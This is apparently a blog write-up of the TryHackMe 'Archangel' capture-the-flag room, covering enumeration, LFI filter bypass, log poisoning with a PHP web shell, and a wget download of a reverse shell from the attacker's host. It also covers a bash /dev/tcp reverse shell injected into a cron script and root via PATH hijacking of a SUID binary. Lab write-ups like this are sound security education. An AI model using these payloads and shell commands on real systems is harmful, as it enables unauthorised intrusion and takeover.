---
layout: post
permalink: /posts/thm/archangel
title: "Archangel"
---

Archangel is pretty good challlenge in which you can test your web security skills. The room is marked as "easy" but to be honest it was hard for me. It is focused on Boot2root, Web exploitation, LFI and Privilege escalation.

We are going to start our enumeration process with nmap.

```
nmap -sC -sV <IP>
```

![nmap](/assets/images/thm/archangel/nmap.png)

There are two open ports, SSH 22 and HTTP 80. Let's scan for any hidden directories with gobuster.

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,txt,bak
```

While we are waiting for gobuster we can visit the web server.

![website](/assets/images/thm/archangel/website.png)

From here we can notice an additional hostname `mafialive.thm`. Add it this hostname to `/etc/hosts` and start one more gobuster scan.

```
gobuster dir -u http://mafialive.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,txt,bak
```

First scan is ready and we have found some directories.

![gobuster](/assets/images/thm/archangel/gobuster.png)

Let's first navigate to `flags` directory.

![flags-page](/assets/images/thm/archangel/flags-page.png)

This flag.html redirects us to youtube

![redirect](/assets/images/thm/archangel/redirect.png)

Okay, the other directories also didn't show something useful, let's try the hostname we found earlier.

![dev-flag](/assets/images/thm/archangel/dev-flag.png)

We have found the first flag. Now let's see what happened with the second gobuster scan.

![gobuster2](/assets/images/thm/archangel/gobuster2.png)

There is `robots.txt` and `test.php`, let's first visit the robots file.

![robots](/assets/images/thm/archangel/robots.png)

Well, robots.txt shows us a directory that we already, let's visit it.

![test-php](/assets/images/thm/archangel/test-php.png) 

When we click the button a query variable appears in the url, here is our place that we are going to play with. It looks that this button reads a file located on the server which probably means that this could be vulnerable to LFI.

![test-php-exec](/assets/images/thm/archangel/test-php-exec.png)

I started testing some different methods to bypass LFI vulnerability using this amazing site <https://book.hacktricks.xyz/pentesting-web/file-inclusion> Here are some of the methods I tried which were unseccessfull

```
http://mafialive.thm/test.php?view=/etc/passwd
http://mafialive.thm/test.php?view=../../etc/passwd
http://mafialive.thm/test.php?view=expect://ls
http://mafialive.thm/test.php?view=php://input&cmd=ls
http://mafialive.thm/test.php?view=../../../etc/passwd%00
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/etc/passwd
```

I decided to try to use these filters with a file that we already know that we are able to read and I finally found that we are able to read files when we decode the content using php filter

```
php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
```

![test-php-success](/assets/images/thm/archangel/test-php-success.png)

We can decode the above using the following command

```
echo PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg== | base64 -d
```

or we can use this site <https://gchq.github.io/CyberChef/>

![decode](/assets/images/thm/archangel/decode.png)

It just prints **Control is an illusion**. Well let's try to check whether we'll be able to read `test.php`

![test-php-encoded](/assets/images/thm/archangel/test-php-encoded.png)

Good... we already know how to decode it. I pasted the input in a file just to be able to review it better.

![source-code](/assets/images/thm/archangel/source-code.png)

So, the code is checking for two conditions:
    it should not contain `../..`
    it should contain `/var/www/html/development_testing`

Knowing that, I tried to read /etc/passwd

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd
```

![test-php-passwd](/assets/images/thm/archangel/test-php-passwd.png)

Well done... we have found that there is a user  called archangel on the system. From here I didn't know what to do (when I have already finished the challenge I remembered that I could try to brute force SSH service but...), so I started searching about how we can proceed as we know that there is a LFI vulnerability (the solution is in <https://book.hacktricks.xyz/pentesting-web/file-inclusion> that I used earlier but whatever...) I found the following article <https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d> . In short it's an attack called LFI Poisoning that allowed us to inject a code to server log trough the HTTP headers. So, I tried to read the server's log file.

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..///var/log/apache2/access.log
```

![test-php-log](/assets/images/thm/archangel/test-php-log.png)

Very good, we can access the log file. Now to be able to add some code into the headres we can use Burp Suite. Turn the intercepter on and send the above request again and change the User-Agent header with the following code:


```php
<?php system($_GET['c'];)?>
```

![burp](/assets/images/thm/archangel/burp.png)

This code allows us to execute any commands on the server. From here we can start python server on our machine with php reverse shell code on it and we'll be able to download this script on the server. Let's do it... start the python server

```
python3 -m http.server
```

I have used the following script <https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php> (change the IP address with your attacking host)

Now we can download the script on the server using the following request

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..///var/log/apache2/access.log&c=wget%20http://10.9.9.122:8000/rev.php
```

Once we download the script we can start a listener on our side to be able to get shell. 

```
nc -lvnp 1234
```

and navigate to `http://mafialive.thm/rev.php`

![rev-shell](/assets/images/thm/archangel/rev-shell.png)

Now we need to escalate our privileges but let's first stabilize our shell

```
/usr/bin/script -qc /bin/bash /dev/null
control+z to background
stty raw -echo
fg
export TERM=xterm
```

We do not have any passwords but I awlays try to check whether the current user has any rights to execute commands as root using `sudo -l`. However that wasn't our way. Next I tried to check for any cronjobs

```
cat /etc/passwd
```

![cat-crontab](/assets/images/thm/archangel/cat-crontab.png)

It looks that there is a script which are run every minute by the user archangel. Let's check whether we can manipulate it.

![cat-sh](/assets/images/thm/archangel/cat-sh.png)

Perfect we have permission to write on this file. So, we can add a reverse shell code there and after a minute we'll receive a shell with the archangel user.

```
echo bash -i >& /dev/tcp/<your-ip>/4444 0>&1 >> helloworld.sh
```

start a listener and wait for a little bit

```
nc -lvnp 4444
```

![archangel-rev](/assets/images/thm/archangel/archangel-rev.png)

Here we go. Again stabilize our shell

```
/usr/bin/script -qc /bin/bash /dev/null
control+z to background
stty raw -echo
fg
export TERM=xterm
```

Now, listing the files in the archangel's home directory we can find a backup file owned by root. I used the `file` command to see what is this file

![file-backup](/assets/images/thm/archangel/file-backup.png)

It's a file with SUID(SUID allows an alternate user to run an executable with the same permissions as the owner of the file) and ELF(executable and link format). Executing the file returns us an error related to missing files, so let's the execute `strings` command te see any human readable strings in the content of the file.

```
strings backup
```

![strings-backup](/assets/images/thm/archangel/strings-backup.png)

The file tries to execute the cp command without absolute path, which means it search for cp commamnd an each directory, which means we can create our own cp file in this directory and the backup file will catch the first cp file which it finds. So, as the file can be executed with the permission with the its owner we can call a shell that will return us a root shell.

```
nano cp
```
cp content:
```
#!/bin/bash

/bin/bash -p
```

we need to add an executable permission to the file

```
chmod +x cp
```

and finally we need to add this file to the PATH envirnoment variable

```
export PATH=.:$PATH
```

Now just execute the backup file

```
./backup
```
![root](/assets/images/thm/archangel/root.png)

